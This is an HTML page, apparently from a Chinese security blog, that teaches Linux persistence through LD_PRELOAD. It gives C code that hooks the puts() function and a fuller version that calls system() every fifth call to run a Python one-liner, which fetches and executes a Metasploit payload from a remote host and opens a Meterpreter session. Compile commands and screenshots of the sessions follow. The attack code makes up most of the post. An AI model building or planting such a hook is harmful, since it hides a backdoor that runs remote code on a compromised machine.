@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Linux权限维持之LD_PRELOAD</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/projects/" title="Projects">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg> Projects
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/tools/" title="Tools">
+                        Tools
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h2 id="ld_preload">LD_PRELOAD</h2>
+<p>Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件<code>/etc/ld.so.preload</code>，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和<code>/etc/ld.so.preload</code>配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</p>
+<p>通过LD_PRELOAD环境变量，能够轻易的加载一个动态链接库。通过这个动态库劫持系统API函数，每次调用都会执行植入的代码。</p>
+<h2 id="dlsym">dlsym</h2>
+<p><strong>dlsym是一个计算机函数，功能是根据动态链接库操作句柄与符号，返回符号对应的地址，不但可以获取函数地址，也可以获取变量地址。</strong></p>
+<p>dlsym定义在Linux操作系统中的dlfcn.h中，函数原型如下：</p>
+<blockquote>
+<p>void * dlsym(void * handle,const char * symbol)</p>
+</blockquote>
+<ul>
+<li>handle：由dlopen打开动态链接库后返回的指针；</li>
+<li>symbol：要求获取的函数或全局变量的名称。</li>
+</ul>
+<p>返回值：void * 指向函数的地址，供调用使用。</p>
+<p>劫持示例代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">puts</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>message) {
+  <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>new_puts)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>message);
+  <span style="color:#66d9ef">int</span> result;
+  new_puts <span style="color:#f92672">=</span> dlsym(RTLD_NEXT, <span style="color:#e6db74">&#34;puts&#34;</span>);
+<span style="color:#75715e">// do some thing …
+</span><span style="color:#75715e">// 这里是puts调用之前
+</span><span style="color:#75715e"></span>  result <span style="color:#f92672">=</span> new_puts(message);
+  <span style="color:#75715e">// 这里是puts调用之后
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>编译命令：</p>
+<p><code>gcc hook.c -o hook.so -fPIC -shared -ldl -D_GNU_SOURCE</code></p>
+<ul>
+<li>-fPIC 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。</li>
+<li>-shared 生成共享库格式</li>
+<li>-ldl 显示方式加载动态库，可能会调用dlopen、dlsym、dlclose、dlerror</li>
+<li>-D_GNU_SOURCE 以GNU规范标准编译</li>
+</ul>
+<p>编写好劫持puts函数的代码后，需要先生成一个Metasploit木马，使得在系统调用puts函数之前，都执行一次木马。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a981d7261f39ee47c93b0e42a8a68a39.png" alt="2020-01-03-13-09-24"></p>
+<p><code>exploit/multi/script/web_delivery</code> 模块能够直接生成一条Python命令，这能够非常方便的获得Meterpreter。
+接下来，将劫持puts函数的代码做一些小改动，在执行puts之前，调用系统函数system来运行python命令，这样每次调用puts都可以获得Meterpreter会话。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/453478b8e6f0c711e8e33e92ff55600e.png" alt="2020-01-03-13-09-40"></p>
+<p>正常执行的过程：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/00ff5dc344eedf05cecd3480d2396db1.png" alt="2020-01-03-13-09-51"></p>
+<p>执行whoami后，由于底层会调用puts函数，因此也会执行python命令，Metasploit不出意外的获得了Meterpreter：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ad5b8eaa7081113775743b6929919ee4.png" alt="2020-01-03-13-10-01"></p>
+<p>接着，为了防止在短时间内获得多个重复的会话，因此需要优化一下代码，例如以某个文件行数和调用puts函数的次数进行取余，就能够达到执行多少次puts函数获得一次Meterpreter。
+优化代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#define BUFFER_SIZE 100
+</span><span style="color:#75715e">#define COMMAND_NUM 5
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">check_file_line</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> filename){
+	<span style="color:#66d9ef">int</span> file_line <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	<span style="color:#66d9ef">char</span> buffer[BUFFER_SIZE];
+	FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> NULL;
+	fp <span style="color:#f92672">=</span> fopen(filename,<span style="color:#e6db74">&#34;r&#34;</span>);
+	<span style="color:#66d9ef">if</span>(fp<span style="color:#f92672">==</span>NULL){
+		<span style="color:#66d9ef">return</span> file_line;
+	}
+
+	<span style="color:#66d9ef">while</span>(fgets(buffer,BUFFER_SIZE,fp)<span style="color:#f92672">!=</span> NULL){
+		file_line <span style="color:#f92672">++</span>;
+	}
+	fclose(fp);
+	<span style="color:#66d9ef">return</span> file_line;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_file_line</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> filename){
+	FILE <span style="color:#f92672">*</span> fp <span style="color:#f92672">=</span> NULL;
+	fp <span style="color:#f92672">=</span> fopen(filename,<span style="color:#e6db74">&#34;a+&#34;</span>);
+	<span style="color:#66d9ef">if</span>(fp <span style="color:#f92672">==</span> NULL){
+		<span style="color:#66d9ef">return</span>;
+	}
+	
+	fputs(<span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,fp);
+	fclose(fp);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">call_system</span>(){
+
+  system(<span style="color:#e6db74">&#34;python -c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">import sys;u=__import__(&#39;urllib&#39;+{2:&#39;&#39;,3:&#39;.request&#39;}[sys.version_info[0]],fromlist=(&#39;urlopen&#39;,));r=u.urlopen(&#39;http://192.168.170.138:8080/o1ZJy3Wue&#39;);exec(r.read());</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>);
+
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">puts</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>message) {
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/err.log&#34;</span>;
+  <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>new_puts)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>message);
+  <span style="color:#66d9ef">int</span> result;
+  <span style="color:#66d9ef">int</span> file_lines <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  new_puts <span style="color:#f92672">=</span> dlsym(RTLD_NEXT, <span style="color:#e6db74">&#34;puts&#34;</span>);
+  add_file_line(filename);
+  file_lines <span style="color:#f92672">=</span> check_file_line(filename);
+  printf(<span style="color:#e6db74">&#34;[+]file_line : %d, NUM = %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,file_lines, COMMAND_NUM);
+  <span style="color:#66d9ef">if</span>(file_lines <span style="color:#f92672">%</span> COMMAND_NUM <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
+  	call_system();
+  }
+  result <span style="color:#f92672">=</span> new_puts(message);
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6923c9d63c7a4b9563bd298f01df9c98.png" alt="2020-01-03-13-10-13"></p>
+<p>在执行至第零次、五次时，成功返回了会话：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7462655c88874bbc909aa75c7cb940f2.png" alt="2020-01-03-13-10-21"></p>
+<p>COMMAND_NUM 可自定义</p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
+<script>
+(function(){
+  let plantumlPrefix = "language-plantuml";
+  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
+    let image = document.createElement("IMG");
+    image.loading = 'lazy'; 
+    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
+    code.parentNode.insertBefore(image, code);
+    code.style.display = 'none';
+  });
+})();
+</script>
+
+</body>
+</html>
